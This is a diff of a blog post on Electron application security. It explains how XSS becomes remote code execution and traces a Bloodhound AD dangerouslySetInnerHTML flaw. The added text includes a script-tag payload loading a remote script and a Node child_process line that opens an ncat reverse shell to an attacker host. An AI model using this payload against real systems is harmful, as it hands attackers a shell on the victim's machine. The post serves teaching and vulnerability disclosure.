@@ -2,23 +2,97 @@
 
 _"In the face of ambiguity, refuse the temptation to guess."_ -The Zen of Python
 
-Electron is often regarded as insecure by design. While this reputation is not entirely undeserved -make no mistake Electron has sharp edges- like any application security comes down to good engineering and software developement practices.
+Electron is often regarded as insecure by design. While this reputation is not entirely undeserved, application security is far more dependent upon engineering practices rather than the underlying framework. That is not to say the frameworks you choose have no bearing on security; it is possible to write secure PHP code, but [due to the language's often unintuative design it's not easy](https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/). Similarly it's possible to write secure Electron applications, though it may not always be easy for a variety of reasons we'll explore.
 
 ## Electron & Kin
 
 [Electron](https://electronjs.org/) is a cross-platform framework for developing desktop applications using "web" technologies like HTML, JavaScript, and CSS. Electron has become very popular in recent years for its ease of use, empowering developers to quickly develope generally good looking, responsive, cross-platform desktop applications. Applications major tech companies like Microsoft Teams, VSCode, Slack, Atom, Spotify, and even secure messaging apps like Signal all use Electron or similar "native web" application frameworks. Electron did not start this trend, embedded webviews have been around for sometime. For example, iMessage is developed using embedded WebKit webviews, which have been [available on MacOS and iOS](https://developer.apple.com/documentation/webkit/wkwebview) for years. Similarly, JavaFX supports embedable WebKit and [Windows has IE objects](https://msdn.microsoft.com/en-us/windows/desktop/aa752084) that can be embedded in 3rd party applications.
 
-There is however an important design change that occured with newer hipster Chrome-based frameworks like Electron and NodeWebKit; in the older frameworks the programmer generally had to selectively expose functionality or objects to the "web context" -that is the JavaScript execution context inside the webview. However, in Electron and kin the unsandboxed NodeJS APIs are _enabled by default_ and the developer must opt-out of this functionality regardless if the application even uses such functionality.
+There is however an important design change that occured with newer hipster Chrome-based frameworks like Electron and NodeWebKit; in the older frameworks the programmer generally had to selectively expose functionality or objects to the "web context" -that is the JavaScript execution context inside the webview. However, in Electron and kin the unsandboxed NodeJS APIs are _enabled by default_ and the developer must opt-out regardless if the application even uses such functionality.
 
 ## Out of the Browser Into the Fire
 
-This change has led to a significant increase in the impact a Cross-site Scripting (XSS) bug can have, since the attacker will gain access to the NodeJS APIs. Back in 2016 [Matt Bryant](https://twitter.com/IAmMandatory), [Shubs Shah](https://twitter.com/infosec_au), and I release some research on finding and exploiting these vulnerabilities in Electron and other native web frameworks. We demonstrating remote code execution vulnerabilities in Textual IRC, Azure Storage Explorer, and multiple markdown editors, as well as a flaw that allowed [remote disclosure of all iMessage data](https://know.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data) on MacOS, and created a cross-platform self-propegating worm in RocketChat in our presentation at [Kiwicon](https://www.kiwicon.org/).
+Since Electron applications are built on web application technologies, unsurprisingly they're often vulnerable to the same flaws found in your everyday web applciation. Whereas in the past web applications flaws have generally been confined to the browser's sandbox, no such limitations exist (by default) in Electron. This change has led to a significant increase in the impact a Cross-site Scripting (XSS) bug can have, since the attacker will gain access to the NodeJS APIs. Back in 2016 [Matt Bryant](https://twitter.com/IAmMandatory), [Shubs Shah](https://twitter.com/infosec_au), and I release some research on finding and exploiting these vulnerabilities in Electron and other native web frameworks. We demonstrating remote code execution vulnerabilities in Textual IRC, Azure Storage Explorer, and multiple markdown editors, as well as a flaw that allowed [remote disclosure of all iMessage data](https://know.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data) on MacOS, and created a cross-platform self-propegating worm in RocketChat in our presentation at [Kiwicon](https://www.kiwicon.org/).
 
-There's a common misconception that the proper fix for a Cross-site Scripting is sanitizing user input. The notation that sanitizing user input can concretely fix an XSS issue is untrue, the only proper fix for XSS is _contextual_ output encoding. That said, it's still a good idea to sanitize user input so do that too (and be sure you're sanatize using a whitelist, not a blacklist) --but you need to ensure it's done _in addition to proper output encoding_. A good rule of thumb is: "sanitize input, encode output," but what does "contextual encoding" entail?
+But what is the root cause of XSS and why is it so hard to prevent? There's a common misconception that the proper fix for a Cross-site Scripting is sanitizing user input. The notation that sanitizing user input can concretely fix an XSS issue is untrue, the only proper fix for XSS is _contextual_ output encoding. That said, it's still a good idea to sanitize user input so do that too (and be sure you're sanatize using a whitelist, not a blacklist) --but you need to ensure it's done _in addition to proper output encoding_. A good rule of thumb is: "sanitize input, encode output," but what does "contextual encoding" entail? Let's explore the details of a couple recent exploits to better understand how XSS manifests and how to prevent it.
 
 ### Bloodhound AD
 
-Bloodhound is an incredibly powerful tool for analyzing the structure of Active Directory deployments, and finding ways to exploit the various privilege relationships therein. The attacker (or defender) runs a ingestor script the dumps data from Active Directory into JSON, the JSON is the parsed into a Neo4j database and an Electron GUI can be used to query and view the results in a nice graph view.
+We'll first look at a couple vulnerabilities I found in the Bloodhound AD tool, one of which was independently discovered by [Fab](https://github.com/BloodHoundAD/BloodHound/issues/267).
+
+Bloodhound is an incredibly powerful tool for analyzing the structure of Windows Active Directory deployments, and finding ways to exploit the various privilege relationships therein. The attacker (or defender) runs a ingestor script the dumps data from Active Directory into JSON, the JSON is the parsed into a Neo4j database and an Electron GUI can be used to query and view the results in a nice graph view. A quick look at the code reveals the application is primarily based on [React](https://reactjs.org/). React generally speaking, and for reasons we'll discuss later, is very good at preventing cross-site scripting attacks, but edge cases do exist. Such an edge case is the use of the `dangerouslySetInnerHTML()` function. This function is similar in functionality to a DOM element's `innerHTML()` function (also dangerous); the function takes in a string and parses it as HTML. 
+
+Using canidate point analysis, a quick search of the unpatched [Bloodhound AD](https://github.com/BloodHoundAD/BloodHound/tree/a7ea5363870d925bc31d3a441a361f38b0aadd0b) codebase and we find four instances of this function being used, excerpt below:
+
+#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L1988)
+```jsx
+<Modal.Body>
+  <Tabs
+    defaultActiveKey={1}
+    id='help-tab-container'
+    justified
+  >
+  <Tab
+    eventKey={1}
+    title='Info'
+    dangerouslySetInnerHTML={this.state.infoTabContent}
+  />
+```
+
+In the excerpt above we can see an attribute of this `this.state` object is passed to our canidate point `dangerouslySetInnerHTML`, from this sink we'll trace backwords to determine if the issue is exploitable, and looking at the definition of `this.state` we can see that it's a basic JavaScript object initialized with empty strings, including the `.infoTabContent` attribute, which is passed as a parameter to our sink:
+
+#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L5)
+```javascript
+export default class HelpModal extends Component {
+  constructor() {
+    super();
+    this.state = {
+      open: false,
+      infoTabContent: '',
+      abuseTabContent: '',
+      opsecTabContent: '',
+      referencesTabContent: '',
+    };
+```
+
+So next we must determine how `.infoTabContent` is set, jumping to the next usage of `infoTabContent` we find:
+
+#### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L239)
+```javascript
+  this.setState({ infoTabContent: { __html: formatted } });
+```
+
+Here we see the empty string `infoTabContent` is replaced with a JavaScript object with the key `__html`, this aligns with [React's documentation](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml) of how `dangerouslySetInnerHTML` works and is a good indication we've correctly traced the code and this value is indeed passed to our sink. The `__html` key's value is the `formatted` variable. So from here we must determine what the variable is, and what it contains. Scrolling up a bit we can see that `formatted` is just a string, which is built using string interpolation with variables `${sournceName}` and `${targetName}`:
+
+```javascript
+} else if (edge.label === 'SQLAdmin'){
+    formatted = `The user ${sourceName} is a SQL admin on the computer ${targetName}.
+
+    There is at least one MSSQL instance running on ${targetName} where the user ${sourceName} is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.
+
+    For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.
+    
+    Author: Scott Sutherland`;
+}
+```
+
+Based on my usage and understanding of the tool, and as the help dialog helpfully points out, these values are based on data collected by the ingestor script from Active Directory i.e. from an 'untrusted' source, and therefor "attacker" controlled (note the ironic inversion of 'attacker' in this context). This confirms the exploitability of our canidate point, attacker controlled content is indeed passed to `dangerouslySetInnerHTML`. All an attacker needs to do is plant malicous values, such as a GPO as Fab demonstrated with the following name:
+
+```html
+aaaaaa<SCRIPT SRC="http://example.com/poc.js">
+```
+
+Where `poc.js` contains:
+
+```javascript
+const { spawn } = require('child_process');
+spawn('ncat', ['-e', '/bin/bash', '<attacker host>', '<some port>']);
+```
+
+Since the GPO name is not properly encoded it will be rendered by the DOM as HTML, and Electron will parse the `<SCRIPT` tag and dutifully retrieve and execute the context of `poc.js`. As discussed before, since the NodeJS APIs are enabled this attacker controlled JavaScript can simply spawn a bash child process and execute arbitrary native code on the machine.
+
+A reasonable scenario here would be blue teams hiding malicous values in their AD deployment waiting for the red team to run Bloodhoud, and subsequently exploit the red team operator's machine. Though blue teams often also run this tool, so were a red team operator in a position to influence the data collected by Bloodhound but otherwise had limited access to AD the exploit could go in the traditional direction too.
+
 
 ### Signal
 
